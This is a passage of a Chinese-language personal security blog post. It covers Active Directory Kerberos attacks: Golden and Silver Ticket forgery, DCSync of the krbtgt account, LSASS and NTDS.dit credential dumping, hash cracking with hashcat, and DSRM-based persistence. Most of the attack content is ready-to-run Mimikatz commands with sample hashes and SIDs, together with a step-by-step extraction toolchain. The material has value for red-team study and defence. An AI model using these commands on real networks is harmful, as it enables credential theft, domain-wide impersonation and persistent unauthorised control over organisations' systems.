class="line">6.KRB_TGS_REQ-客户端把服务票据中的服务器部分和请求一起发送到远程服务器。远程服务器将直接接受该服务器票据，并不需要和KDC直接通信，因为该票据是用远程服务器和KDC共享的长期密钥加密过。解密成功即成功表名KDC已经允许了此次通信。</span><br><span class="line"></span><br><span class="line">自己理解：</span><br><span class="line">A为客户端（Principal），B为服务端</span><br><span class="line">A要登陆B，A必须有B的用户。</span><br><span class="line">A在登陆B的界面输入了用户名和明文密码Administrator/123456。A在发送请求之前会把B用户口令进行hash运算。如果验证通过，这个hash值会成为A和B通信的长期密钥。</span><br><span class="line">进行hash运算后，A会加密一个时间戳。然后发送给身份验证服务（AS）</span><br><span class="line">然后AS会解密时间戳，如果解密成功，表示A成功验证了用户的身份。然后AS会返回会话密钥构建的信息要求A访问特定服务的请求</span><br><span class="line">A会把TGT连同请求一同发送到TGS，TGS收到后会把ST发送回给B</span><br><span class="line">B收到TGS发回来的票据后，A使用票据和请求推送到远程服务器。远程服务器将直接接受该票据。</span><br><span class="line">然后A成功登陆到B</span><br><span class="line"></span><br><span class="line">通俗理解：</span><br><span class="line">你面前有一道门，门后面有钱。要通过这道门你必须要有门的钥匙，当把钥匙插入到锁里面的时候。钥匙会和锁芯进行配对，如果配对成功就会返回咔的一声。代表你能扭动钥匙解锁这把锁，如果钥匙和锁芯对不上钥匙就会被弹出来。当你扭动钥匙的时候，就代表身份验证已经通过你正在开这把锁。当这把锁被开了后你就成功拿到门后面的钱</span><br><span class="line"></span><br><span class="line">关于krbtgt账户和TGT的问题</span><br><span class="line"></span><br><span class="line">1. 问题一：微软对长期密钥的散列值不加SALT</span><br><span class="line"></span><br><span class="line">微软实现的Kerberos版本对MIT原始版本中的一个关键函数做了修改，最终降低了底层的安全性。在MIT原始版本中，首先在明文口令中添加字符串username@DOMAIN.COM，然后经过散列运算生成长期密钥。使用用户名给密码加盐，能够为碰巧密码相同的不同用户生成不同的散列值。只要涉及到密钥的操作，仍然需要使用实际的口令。</span><br><span class="line"></span><br><span class="line">在微软实现版本中，口令转换成Unicode格式，再经过MD4运算生成没有加盐的密钥。这种情况也被称为NT-Hash，和微软十多年来存储长度大于14字符的密码的格式一样。缺少salt意味着任何需要密钥的操作能够直接地使用密码的散列版本，而不是使用实际的密码。这听上去像大家耳熟能详的“pass-the-hash”攻击的根本原因。</span><br><span class="line"></span><br><span class="line">从一个攻击者的角度出发，如果能够提取该域的密码散列值，也就可以利用KRBTGT散列值来伪造TGT。虽然提取散列值看似难以实现，然而实际上，大部分渗透人员认为在普通的企业环境中这并不是一件困难的事情。我们会在白皮书下面的一个章节中作全面深入的解析。</span><br><span class="line"></span><br><span class="line">利用思路</span><br><span class="line"></span><br><span class="line">在微软活动目录中颁发的TGT是可移植的。由于Kerberos的无状态特性，TGT中并没有关于票据来源的标识信息。这意味着可以从某台计算机上导出一个有效的TGT，然后导入到该环境中其他的计算机上。新导入的票据可以用于域的身份认证，并拥有票据中指定用户的权限来访问网络资源。这种特别的攻击方法被称为“pass-the-ticket”攻击。</span><br><span class="line"></span><br><span class="line">所谓的票据攻击就是伪造票据</span><br><span class="line"></span><br><span class="line">客户端的有效性</span><br><span class="line"></span><br><span class="line">由于Kerberos是无状态的，TGT必须包含了同票据授予服务交互所需的全部信息。根据微软实现的Kerberos协议扩展（MS-KILE），KDC负责设置TGT中相应的标志位，而票据授予服务使用这些标志位来颁发服务票据。默认情况下，TGT携带了有关用户的组成员资格、票据所使用的加密类型以及票据的有效期等信息。此外，微软使用TGT来加强域上传统的和最新的身份认证策略。TGT包含一些传统的值来限制账户，例如登录时长、账户是否禁用、账户是否过期、密码失效的时间戳。</span><br><span class="line"></span><br><span class="line">万能票据（Golden Ticket）</span><br><span class="line"></span><br><span class="line">综上所述，微软实现的Kerberos版本中存在的一系列问题所引发的后果是：Kerberos成为了攻击者实施Post-Exploitation的游乐场。如果攻击者能够攻陷KDC和提取KRBTGT散列值。然后利用这些有限信息，攻击者能够为委托人生成任意的TGT。Mimikatz工具把这种特性称之为“万能票据”（golden ticket，直译为“黄金票据”，为突出功能上的特点，意译译为“万能票据”）。万能票据拥有一些有趣的属性，会导致传统企业域中一些严重的安全问题。</span><br><span class="line"></span><br><span class="line">首先，万能票据是全功能的TGT。也就意味着万能票据可用于Kerberos认证的任何服务。票据授予服务盲目地相信TGT中的信息，然后处理TGT并颁发服务票据。内存中插入万能票据并不需要提升权限。而且默认情况下，万能票据的有效期是10年。</span><br><span class="line"></span><br><span class="line">其次，万能票据可以用来绕过当前Kerberos有关加密策略的要求。例如，可以使用DES或RC4加密算法创建一个TGT，即使该域明确支持AES，禁止使用DES或RC4。此情况会产生一个有趣的现象：TGT使用DES加密而服务票据使用AES加密。票据授予服务似乎并不担心TGT，也不拒绝异常行为，因为没有机制让票据授予服务报告关于策略的错误。</span><br><span class="line"></span><br><span class="line">再次，万能票据并没启用任何高级账户策略的设置。微软添加了一个功能来验证服务票据的请求，以确保已禁用的TGT不能用于获得服务票据。然而，该功能的实现存在问题。只有当TGT的寿命超过20分钟时，票据授予服务才会验证TGT的有效性。如果TGT的寿命低于20分钟，票据授予服务将直接颁发服务票据，而不去验证TGT的有效性，默认情况下服务票据具有10小时的有效期。因为攻击者可以利用Mimikatz工具随心所欲的产生票据，所以攻击者只需清除旧的TGT，再替换为寿命少于20分钟的新票据，轻松突破20分钟的限制条件。</span><br><span class="line"></span><br><span class="line">最终，万能票据可以被配置成任意用户和任意组的成员。这也可以创建一个票据，票据中任何用户都可以是任意组的成员。这可以用来绕过文件服务器或其他应用程序上基于用户组的访问限制。万能票据中的用户和SID不必在活动目录中真实存在。也就意味着可以为域中不存在的用户创建TGT,并仍然可以在TGT生命周期内前20分钟内从票据授予服务获得服务票据。</span><br><span class="line"></span><br><span class="line">归根结底，在一个企业的活动目录的环境中，如果KRBTGT账户的丢失，也就意味着环境中的信任关系完全丧失。考虑到攻击者可以生成任意的Kerberos票据，能绕过对任意用户的账户策略，能够让用户成为任意组的成员，所以攻击者简直可以横行无阻。此外，鉴于KRBTGT账户极少更改散列值，攻击者可以在较长的时间内使用这些伪造的票据</span><br><span class="line"></span><br><span class="line">创建“万能票据”的所需条件：</span><br><span class="line">视频：https://www.youtube.com/watch?v=eNbujcPn5c4</span><br><span class="line">①krbtgt账户的NT-Hash：该散列值是用于Kerberos的秘密密钥，仅位于域控服务器的活动目录中。所以攻击者必须攻陷域控服务器并提权至管理员权限；（域管理员权限）</span><br><span class="line">②域账户名称：通常是域管理员“domain admin”；</span><br><span class="line">③域名称；</span><br><span class="line">④域SID：可以从域用户的SID或通过sysinternal中psGetsid.exe获得；</span><br><span class="line"></span><br><span class="line">黄金票据是伪造票据授权授权票据（TGT）</span><br><span class="line"></span><br><span class="line">黄金票据的局限性：</span><br><span class="line">黄金票据欺骗了当前域的管理权限，当KRBTGT账户密码哈希显示在作为多域AD的林一部分的子域中时存在局限性。因为是root域包含全森林管理组。由于Mimikatz通过相对标识符（RID）向票据添加了组成员资格，因此Kerberos票据中的企业管理RID在其创建的域中（基于KRBTGT账户域）被标识为本地。如果通过获取域SID和附加RID创建的域安全标识符(SID)不存在,那么Kerberons票据的持有者不会收到该级别的访问权限。换句话说，在一个多域AD森林中，如果创建的GT（黄金票据）域不包含Enterprise Admins组，则GT不会向森林中其他域提供管理权限。在单个域控AD林中不存在局限性。换句话说，黄金票据在多个AD（域控中）受到只有一个域控的完全控制权限。而在单个AD（域控中）无局限性。</span><br><span class="line"></span><br><span class="line">绕过黄金票据的局限性</span><br><span class="line">在迁移方案中，从DomainA迁到DomainB的用户将原始DomainA用户SID值添加到DomainB的SID History属性中。当用户使用新用户登陆DomainB时，DomainA SID将与确定访问DomainB用户组一起验证。这意味着可以将SID添加到SID历史记录以扩展访问。一旦Mimikatz支持Golden和（Silver Tickets）中的SID History，事情会变的更加有趣，因为AD Forest中的任何组都可以被包含并且用于授权访问。使用最新版本的Mimikatz，我们现在可以将SID历史记录添加到Forest Enterpise Admin组的Golden Ticket中。一旦单个域名的KRBTGT账户密码哈希被捕获到时，通过黄金票据可以伪造用户登陆到整个森林中。</span><br><span class="line"></span><br><span class="line">使用Mimikatz伪造Kerberons黄金票据</span><br><span class="line">kerberos::golden  /admin:ADMIINACCOUNTNAME  /domain:DOMAINFQDN /id:ACCOUNTRID  /sid:DOMAINSID  /krbtgt:KRBTGTPASSWORDHASH  /ptt</span><br><span class="line">生成hash值</span><br><span class="line">命令例子：kerberos::golden  /admin:darthvader  /domain:lab.adsercurity.org /id:2601  /sid: S-1-5-21-4155807533-921486164-2767329826 /krbtgt:8a2f1adcdd519a23515780021d2d178a  /ptt</span><br><span class="line"></span><br><span class="line">导出hash</span><br><span class="line">mimikatz log  &quot;lsadump::dcsync /domain:test.local /user:krbtgt&quot;</span><br><span class="line">找到如下信息：</span><br><span class="line">/domain：test.local</span><br><span class="line">/sid:S-1-5-21-4155807533-921486164-2767329826</span><br><span class="line">/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f</span><br><span class="line">2、生成Golden Ticket</span><br><span class="line">伪造的用户设置为god,执行:</span><br><span class="line">mimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826</span><br><span class="line">/aes256:af71a24ea463446f9b4c645e1bfe1e0f1c70c7d785df10acf008106a055e682f /user:god</span><br><span class="line">/ticket:gold.kirbi&quot;</span><br><span class="line">生成文件gold.kirbi</span><br><span class="line">3、伪造Golden Ticket获得域控权限</span><br><span class="line">导入Golden Ticket，执行如下命令：</span><br><span class="line">kerberos::ptt c:\test\gold.kirbi</span><br><span class="line">/domain -----完整的域名，在这个例子中：“lab.adsecurity.org”</span><br><span class="line">/ sid ----域的SID,在这个例子中：“S-1-5-21-1473643419-774954089-2222329127”</span><br><span class="line">/ sids --- AD森林中账户/组的额外SID，凭证拥有权限进行欺骗。通常这将是根域Enterprise Admins组的“S-1-5-21-1473643419-774954089-5872329127-519”值。? </span><br><span class="line"> / user ---伪造的用户名</span><br><span class="line">/groups（可选）---用户所属的组RID（第一组是主组）。添加用户或计算机帐户RID以接收相同的访问权限。默认组：513,512,520,518,519为默认的管理员组。</span><br><span class="line">/ krbtgt---域KDC服务帐户（KRBTGT）的NTLM密码哈希值。用于加密和签署TGT。</span><br><span class="line">/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用或使用/ ptt立即将黄金票据插入内存以供使用。</span><br><span class="line">/ ptt - 作为/ ticket的替代品 - 使用它来立即将伪造的票据插入到内存中以供使用。</span><br><span class="line">/ id（可选） - 用户RID。Mimikatz默认值是500（默认管理员帐户RID）。</span><br><span class="line">/ startoffset（可选） - 票据可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值是0。</span><br><span class="line">/ endin（可选） - 票据使用时间范围。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</span><br><span class="line">/ renewmax（可选） - 续订最长票据有效期。Mimikatz默认值是10年（?5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</span><br><span class="line">/ sids（可选） - 设置为AD林中企业管理员组（ADRootDomainSID）-519）的SID，以欺骗整个AD林（AD林中每个域中的AD管理员）的企业管理权限。</span><br><span class="line">/ aes128 - AES128密钥</span><br><span class="line">/ aes256 - AES256密钥</span><br><span class="line">黄金票默认组：</span><br><span class="line">域用户SID：S-1-5-21 &lt;DOMAINID&gt; -513</span><br><span class="line">域管理员SID：S-1-5-21 &lt;DOMAINID&gt; -512</span><br><span class="line">架构管理员SID：S-1-5-21 &lt;DOMAINID&gt; -518</span><br><span class="line">企业管理员SID：S-1-5-21 &lt;DOMAINID&gt; -519（只有在森林根域中创建伪造票证时才有效，但为AD森林管理员权限添加使用/ sids参数）</span><br><span class="line">组策略创建者所有者SID：S-1-5-21 &lt;DOMAINID&gt; -520</span><br><span class="line">命令格式如下：</span><br><span class="line">kerberos :: golden / user：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</span><br><span class="line"></span><br><span class="line">命令示例：</span><br><span class="line"></span><br><span class="line">.\mimikatz “kerberos::golden  /user:DarthVader  /domain:rd.lab.adsecurity.org  /id:500 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321  /ptt” exit</span><br><span class="line">参考文章：https://www.cnblogs.com/backlion/p/8127868.html</span><br><span class="line"></span><br><span class="line">白银票据：</span><br><span class="line">0x00介绍</span><br><span class="line">白银票据是伪造Kerberons票证授予服务（TGS）的票，也称为服务票据。白银票据与环境票据不一样的是，白银票据没有与域控进行通信，白银票据只能单一访问某个服务。</span><br><span class="line"></span><br><span class="line">0x01特点</span><br><span class="line">1.白银票据是一个有效的票据授予服务（TGS），因为Kerberons验证服务运行的每台服务器都对服务器主体名称的服务账户进行加密签名</span><br><span class="line">2.黄金票据是伪造TGT并且获得任何Kerberons服务，而白银票据是伪造（TGS）Kerberons票据，这意味着白银票据仅限于特定服务器上的任何服务</span><br><span class="line">3.大多数服务不验证PAC（通过将PAC校验和发送到域控进行PAC验证），因此使用服务账户密码哈希生成有效TGS可以完全伪造PAC</span><br><span class="line">4.攻击者需要服务账户密码哈希值</span><br><span class="line">5.TGS是伪造的，所有没有和TGT通信，这意味着DC验证过</span><br><span class="line">6.任何事件日志都在目标服务器上</span><br><span class="line"></span><br><span class="line">0x02要求</span><br><span class="line">1.域名</span><br><span class="line">2.域的SID</span><br><span class="line">3.域用户</span><br><span class="line">4.目标服务器的域名全称，此处为域控的全称</span><br><span class="line">5.用户ID（可选，管理员ID为500）</span><br><span class="line">6.运行在目标服务器上的kerberons服务，入mssql，http，cifs</span><br><span class="line">7.服务的NTLM散列（计算机用户或用户账户）</span><br><span class="line"></span><br><span class="line">命令例子：kerberons::golden /user:Haqksd /domain:haq.com /sid:S-1-5-21-2289215397-288801521-4019949533-1000  /tarfet:yk.haq.com /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /pt</span><br><span class="line"></span><br><span class="line">0x03引用文章的具体例子</span><br><span class="line">文章地址：https://www.cnblogs.com/backlion/p/8119013.html</span><br><span class="line">/domain –完整的域名称，如：lab.adsecurity.org</span><br><span class="line"></span><br><span class="line">/sid –域的SID，如：S-1-5-21-1473643419-774954089-2222329127</span><br><span class="line"></span><br><span class="line">/user – 域用户名</span><br><span class="line"></span><br><span class="line">/ groups（可选） - 用户所属的组RID</span><br><span class="line"></span><br><span class="line">/ ticket（可选） - 提供一个路径和名称，用于保存Golden Ticket文件以便日后使用，或者使用/ ptt立即将黄金票据插入到内存中以供使用</span><br><span class="line"></span><br><span class="line"> /ptt - 作为/ ticket的替代品，使用它来立即将伪造的票据插入到内存中以供使用。</span><br><span class="line"></span><br><span class="line">/ id（可选） - 用户RID，Mimikatz默认值是500（默认管理员帐户RID）</span><br><span class="line"></span><br><span class="line">/ startoffset（可选） - 票证可用时的起始偏移（如果使用此选项，通常设置为-10或0）Mimikatz默认值是0</span><br><span class="line"></span><br><span class="line">/ endin（可选） - 票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为10小时</span><br><span class="line"></span><br><span class="line">/ renewmax（可选） - 续订最长票据有效时间，Mimikatz默认值是10年，Active Directory默认Kerberos策略设置为最长为7天</span><br><span class="line"></span><br><span class="line">1.白银票据需要的参数</span><br><span class="line">/target –目标服务器的FQDN</span><br><span class="line"></span><br><span class="line">FQDN：(Fully Qualified Domain Name)全限定域名：同时带有主机名和域名的名称。（通过符号“.”）</span><br><span class="line"></span><br><span class="line">/service –运行在目标服务器上的kerberos服务，该服务主体名称类型如cifs，http，mssql等</span><br><span class="line"></span><br><span class="line">/rc4 –服务的NTLM散列（计算机帐户或用户帐户）</span><br><span class="line"></span><br><span class="line">2.白银票据默认组</span><br><span class="line">域用户SID：S-1-5-21 &lt;DOMAINID&gt; -513</span><br><span class="line"></span><br><span class="line">域管理员SID：S-1-5-21 &lt;DOMAINID&gt; -512</span><br><span class="line"></span><br><span class="line">架构管理员SID：S-1-5-21 &lt;DOMAINID&gt; -518</span><br><span class="line"></span><br><span class="line">企业管理员SID：S-1-5-21 &lt;DOMAINID&gt; -519</span><br><span class="line"></span><br><span class="line">组策略创建所有者SID：S-1-5-21 &lt;DOMAINID&gt; -520</span><br><span class="line"></span><br><span class="line">3. Mimikatz命令创建白银票据</span><br><span class="line">以下Mimikatz命令会在服务器adsmswin2k8r2.lab.adsecurity.org上为CIFS服务创建白银票据。为了成功创建Silver Ticket，需要从AD域转储中或在本地系统上运行Mimikatz来获获取adsmswin2k8r2.lab.adsecurity.org中AD计算机帐户密码哈希值。NTLM密码哈希与 rc4参数一起使用。服务SPN类型也需要在/ service参数中标识。目标计算机的FQDA需要在/ target参数中使用以及/ sid参数中的域SID。命令如下：</span><br><span class="line"></span><br><span class="line">mimikatz “kerberos::golden /user:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org /rc4:d7e2b80507ea074ad59f152a1ba20458 /service:cifs /ptt” exit </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">0x05 白银票据在各种服务中的实列</span><br><span class="line">  1.白银票据的服务列表</span><br><span class="line"> Service Type	 Service Silver Tickets</span><br><span class="line">WMI	 HOST</span><br><span class="line">RPCSS</span><br><span class="line">PowerShell Remoting</span><br><span class="line"></span><br><span class="line"> HOST</span><br><span class="line">HTTP</span><br><span class="line">WinRM	 HOST</span><br><span class="line">HTTP</span><br><span class="line">Scheduled Tasks	 HOST</span><br><span class="line"> Windows File Share (CIFS)	 CIFS</span><br><span class="line"> LDAP operations including</span><br><span class="line"></span><br><span class="line">Mimikatz DCSync</span><br><span class="line"></span><br><span class="line"> LDAP</span><br><span class="line"> Windows Remote Server Administration Tools	 RPCSS</span><br><span class="line">LDAP</span><br><span class="line">CIFS</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">2.Windows共享（CIFS）管理访问的银票</span><br><span class="line">为“ cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。</span><br><span class="line"></span><br><span class="line">注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括</span><br><span class="line"></span><br><span class="line">c $共享，我们能够将文件拷贝到共享文件中。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 3.具有管理员权限的Windows计算机（HOST）白银票据</span><br><span class="line">创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">利用HOST Silver Ticket，我们可以创建一个新的计划任务。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">或者通过利用HOST Silver Ticket，我们可以修改存在的计划任务。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> 4.Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行</span><br><span class="line">为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> 5.白银票据证连接到具有管理员权限Windows计算机上的LDAP</span><br><span class="line">为“ ldap ”服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注：lsadump::dcsync</span><br><span class="line"></span><br><span class="line">向 DC 发起一个同步对象（可获取帐户的密码信息）的质询。需要的权限包括管理员组（Administrators），域管理员组（ Domain Admins）或企业管理员组（Enterprise Admins）以及域控制器的计算机帐户，只读域控制器默认不允许读取用户密码数据。</span><br><span class="line"></span><br><span class="line"> 6.白银票据证连接到具有管理员权限Windows计算机上的WMI</span><br><span class="line"> 为“ HOST ”服务和“ rpcss ”服务创建白银票据，以使用WMI在目标系统上远程执行命令。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">注入这些白银票据之后，我们可以通过运行“klist”来确认Kerberos TGS票据在内存中注入白银票据后，我们可以通过“传票”来调用WMIC或Invoke-WmiMethod在目标系统上运行命令。</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Invoke-WmiMethod win32_process -ComputerName $ Computer -Credential $ Creds -name create -argumentlist“$ RunCommand”</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  7.访问域控上“cifs”服务实列</span><br><span class="line">首先需要获得如下信息：</span><br><span class="line"></span><br><span class="line">/domain</span><br><span class="line"></span><br><span class="line">/sid</span><br><span class="line"></span><br><span class="line">/target:目标服务器的域名全称，此处为域控的全称</span><br><span class="line"></span><br><span class="line">/service：目标服务器上面的kerberos服务，此处为cifs</span><br><span class="line"></span><br><span class="line">/rc4：计算机账户的NTLM hash，域控主机的计算机账户</span><br><span class="line"></span><br><span class="line">/user：要伪造的用户名，此处可用silver测试</span><br><span class="line"></span><br><span class="line">在域控上执行如下命令来获取域控主机的本地管理员账户hash</span><br><span class="line"></span><br><span class="line">mimikatz log &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line"></span><br><span class="line">如图:</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line"></span><br><span class="line">此处要找到计算机账户，也就是Username : WIN-8VVLRPIAJB0$的NTLM hash，如果是其他账户，那么会失败,也就是需要共享服务账号。</span><br><span class="line"></span><br><span class="line">整理以上获得的信息如下：</span><br><span class="line"></span><br><span class="line">/domain:test.local</span><br><span class="line"></span><br><span class="line">/sid:S-1-5-21-4155807533-921486164-2767329826</span><br><span class="line"></span><br><span class="line">/target:WIN-8VVLRPIAJB0.test.local</span><br><span class="line"></span><br><span class="line">/service:cifs</span><br><span class="line"></span><br><span class="line">/rc4:d5304f9ea69523479560ca4ebb5a2155</span><br><span class="line"></span><br><span class="line">/user:silver</span><br><span class="line"></span><br><span class="line">使用mimikatz执行如下命令导入Silver Ticket</span><br><span class="line"></span><br><span class="line">mimikatz &quot;kerberos::golden /domain:test.local /sid:S-1-5-21-4155807533-921486164-2767329826 /target:WIN-8VVLRPIAJB0.test.local /service:cifs /rc4:d5304f9ea69523479560ca4ebb5a2155 /user:silver /ptt&quot;</span><br><span class="line"></span><br><span class="line">如图，成功导入，此时可以成功访问域控上的文件共享</span><br></pre></td></tr></table></figure>
<p>8.提取各种密码和hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">用mimkatz提取密码和hash</span><br><span class="line">提取AD的哈希</span><br><span class="line">lsadumo::lsa /inject exit</span><br><span class="line">转储LSASS内存</span><br><span class="line">sekurlsa::minidump c:\temp\lsass.dmp</span><br><span class="line">提取KRBTGT用户账户的密码数据</span><br><span class="line">privilege::debug lsadump::dcsync /domain:域名     user:krbtgt exit</span><br><span class="line">管理员用户帐户提取密码数据：</span><br><span class="line">Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:rd.adsecurity.org /user：Administrator&quot; exit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">从NTDS.DIT中提取哈希</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">提取出来的文件通过ntdsdump是无法提取的通过esedbexport来恢复。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">安装：</span><br><span class="line">wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz`</span><br><span class="line">apt-get install autoconf automake autopoint libtool pkg-config</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">ldconfig</span><br><span class="line">esedbexport -m tables ntds.dit</span><br><span class="line">大概需要（20-30分钟）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">最后生成在./ntds.dit.export/</span><br><span class="line">使用ntdsxtract提取域信息</span><br><span class="line">git clone https://github.com/csababarta/ntdsxtract.git</span><br><span class="line">python setup.py build &amp;&amp; python setup.py install</span><br><span class="line">提取哈希:(这里需要将刚拷出来的三个文件中的系统复制到当前目录下）</span><br><span class="line">$ dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 output --syshive SYSTEM --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout |tee all_user_info.txt</span><br><span class="line">这样提取出来之后已经是转换成hashcat可破解的格式</span><br><span class="line">hashcat -m 1000 ntout ./password.txt</span><br></pre></td></tr></table></figure>
<p>9.DSRM密码同步将域控权限持久化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">获取到域控权限后如何利用DSRM密码同步将域管权限持久化。</span><br><span class="line">Windows Server 2008需要安装KB961320补丁才能支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。</span><br><span class="line">KB961320</span><br><span class="line">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni</span><br><span class="line">巧用DSRM密码同步将域控权限持久化</span><br><span class="line">http://drops.xmd5.com/static/drops/tips-9297.html</span><br></pre></td></tr></table></figure>
<h2 id="0x02相关资料"><a href="#0x02相关资料" class="headerlink" title="0x02相关资料"></a>0x02相关资料</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SPN扫描</span><br><span class="line">https://adsecurity.org/?p=1508</span><br><span class="line">扫描SQLServer的脚本</span><br><span class="line">https://github.com/PyroTek3/PowerShell-AD-Recon</span><br><span class="line">Kerberos的黄金门票</span><br><span class="line">https://adsecurity.org/?p=1640</span><br><span class="line">域服务账号破解实践</span><br><span class="line">http://bobao.360.cn/learning/detail/3564.html</span><br><span class="line">Kerberos的认证原理</span><br><span class="line">http://blog.csdn.net/wulantian/article/details/42418231</span><br><span class="line">深刻理解windows安全认证机制ntlm＆Kerberos</span><br><span class="line">的Kerberos身份验证流程</span><br><span class="line">https://klionsec.github.io/2016/08/10/ntlm-kerberos/</span><br><span class="line">敞开的地狱之门kerberons</span><br><span class="line">https://www.freebuf.com/articles/system/45631.html</span><br><span class="line">黄金票据的使用</span><br><span class="line">https://www.youtube.com/watch?v=eNbujcPn5c4</span><br><span class="line">白银票据的使用</span><br><span class="line">https://www.youtube.com/watch?v=jVqKVdBYPp0</span><br></pre></td></tr></table></figure>
<p>转载请声明：转自422926799.github.io</p>

  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="http://github.com/422926799">Proyectos</a></li>
         
          <li><a href="/Search">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
